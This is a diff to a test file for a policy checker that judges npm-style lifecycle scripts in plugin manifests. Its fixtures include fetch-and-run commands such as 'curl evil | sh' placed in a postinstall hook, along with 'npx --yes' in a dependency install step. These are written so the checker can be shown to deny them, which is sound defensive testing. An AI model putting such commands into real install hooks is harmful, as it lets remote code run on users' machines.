@@ -1,5 +1,5 @@
 import { describe, it, expect } from "vitest";
-import { evaluateScriptPolicy, DEFAULT_POLICY } from "../src/scripts";
+import { evaluateScriptPolicy, evaluateManifestScripts, DEFAULT_POLICY } from "../src/scripts";
 
 describe("lifecycle script policy", () => {
   it("denies curl | sh regardless of phase", () => {
@@ -40,5 +40,49 @@ describe("lifecycle script policy", () => {
     const policy = { ...DEFAULT_POLICY, defaultAllow: ["postinstall" as const] };
     const r = evaluateScriptPolicy({ dependency: "x", phase: "postinstall", command: "echo hi" }, policy);
     expect(r.decision).toBe("require-review");
+  });
+});
+
+// ─── B18: evaluateManifestScripts ────────────────────────────────────────────
+
+describe("evaluateManifestScripts", () => {
+  it("flags postinstall curl | sh as not ok", () => {
+    const { ok, issues } = evaluateManifestScripts({
+      name: "evil-plugin",
+      scripts: { postinstall: "curl evil | sh" },
+    });
+    expect(ok).toBe(false);
+    expect(issues).toHaveLength(1);
+    expect(issues[0].decision).toBe("deny");
+    expect(issues[0].phase).toBe("postinstall");
+  });
+
+  it("flags require-review for npm run build under default-deny policy", () => {
+    const { ok, issues } = evaluateManifestScripts({
+      name: "my-plugin",
+      scripts: { build: "npm run build" },
+    });
+    // build is not a recognized lifecycle phase, but npm run build matches soft allowlist.
+    // Under default-deny (no phases in defaultAllow), it should be require-review.
+    expect(ok).toBe(false);
+    expect(issues).toHaveLength(1);
+    expect(issues[0].decision).toBe("require-review");
+  });
+
+  it("flags npx --yes in dependency lifecycle", () => {
+    const { ok, issues } = evaluateManifestScripts({
+      name: "my-plugin",
+      dependencies: [{ type: "npm", name: "x", lifecycle: { install: "npx --yes foo" } }],
+    });
+    expect(ok).toBe(false);
+    expect(issues).toHaveLength(1);
+    expect(issues[0].decision).toBe("deny");
+    expect(issues[0].dependency).toBe("x");
+  });
+
+  it("allows a manifest with no scripts", () => {
+    const { ok, issues } = evaluateManifestScripts({ name: "clean-plugin" });
+    expect(ok).toBe(true);
+    expect(issues).toHaveLength(0);
   });
 });
